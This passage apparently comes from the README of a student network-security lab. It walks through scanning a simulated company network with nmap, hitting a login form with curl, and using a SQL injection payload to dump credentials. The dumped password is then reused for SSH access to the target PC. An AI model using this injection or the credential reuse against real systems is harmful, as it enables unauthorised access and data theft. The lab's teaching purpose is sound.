Web Server hosting a stub site using NodeJS\n    2. MySQL Server hosting sensitive information\n-   Employee Network\n    1. BobPC which represent the hacker host\n    2. TomPC which represent the target host\n-   Company Network\n    1. All the Employee network\n    2. Web Server\n\n# Background Scenario\n\nThis lab is about a industrial espionage, represented by Bob, who is infiltrated inside a company lan network and found, among a lot of other devices, one vulnerable computer that belongs to Tom and an useful site open ONLY inside the company network.\n\nDuring the demostration scenario we found out these IP:\n\n-   _172.19.0.1_ - Company Network\n-   _172.19.0.2_ - Bob PC on company network\n-   _172.19.0.3_ - Tom PC on company network\n-   _172.19.0.4_ - Web Server on company network\n-   _172.20.0.1_ - Employee Network\n-   _172.20.0.2_ - Bob PC on employee network\n-   _172.20.0.3_ - Tom PC on employee network\n\nAnd we don't have any access to the Web network\n\n# Instruction: what to do\n\n1. Footprinting: gather information online about the organization\n2. Scanning: scan vulnerable point of access\n3. Enumeration: probing more intrusive of vulnerable services\n4. Exploitation: attacking those potential vulnerability\n\n## Footprinting\n\nIn this case scenario we're already connected to the local network, so we've already gathered enought information about our target\n\n## Scanning\n\nWe start find out our IP address on the networks using `ifconfig` command, and we found out.\n\nUsing then `nmap` tool with these options:\n\n-   “-sn” means “no port scan”\n-   “-PE” sends ICMP Echo Request\n-   “--send-ip” to not send ARP packets\n\nWe found out some host IP:\n\n**_Company Network_**\n\n<img src=\"https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/company_network.png\" width=500>\n\n**_Employee Network_**\n\n<img src=\"https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/employee_network.png\" width=500>\n\n## Enumeration\n\nWe're interested in the Web Server and in Tom PC, so we can scan more aggressively to find about any open port\n\nIf we use simply a TPC SYN scan from nmap, we find vague information:\n\n<img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/webserver_ss.png\" width=500>\n\nElse, if we explore more with a Version Detection scan, we can scan even beyond the typical use of a port like 8080:\n\n<img src=\"https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/webserver_sv.png\" width=500>\n\nand we find about a web server open on port 8080.\n\nMeanwhile on Tom PC we found an open SSH port\n\n<img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/tom_sv.png\" width=500>\n\nWe can think about SSH after getting information about the site.\nNow we can find about this site (in a real case scenario we should use DirBuster to map the entire site) and the main page.\n\n<img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/webserver_curl.png\" width=500>\n\nWe retrived the html page using `curl` and found out about a login form, which we can try to exploit.\n\n## Exploitation\n\nWe can try some usual combination for the form\n\n```bash\ncurl -X POST -d 'username=a&password=b' 172.19.0.4:8080\n```\n\nWhich returns \"Error value(s) missing\"\n\n```bash\ncurl -X POST -d 'username=&password=b' 172.19.0.4:8080\n```\n\nWhich returns\n\n`{\"success\":false,\"response\":\"No user found\",\"result\":[]}`\n\nand we can try last one with MySQL injection using OR and commenting syntax\n\n```bash\ncurl -X POST -d 'username=\" OR 1<2; -- &password=b' 172.19.0.4:8080\n```\n\nwhich return us a bunch of credentials\n\n<img src=\"https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/webserver_sql.png\" width=500>\n\nincluding only one user called Tom with:\n\n```\nusername = tcasaccio1\npassword = YLN1NrMdGN\n```\n\n## SSH Access\n\nNow that we gather those information, we can hope that the only user we know has the same user and password as this database.\n\nWe can try to log in using:\n\n```bash\nssh tcasaccio1@172.20.0.3\n```\n\n# SQL Injection Procedure\n","author":"AntonioAvolio"}
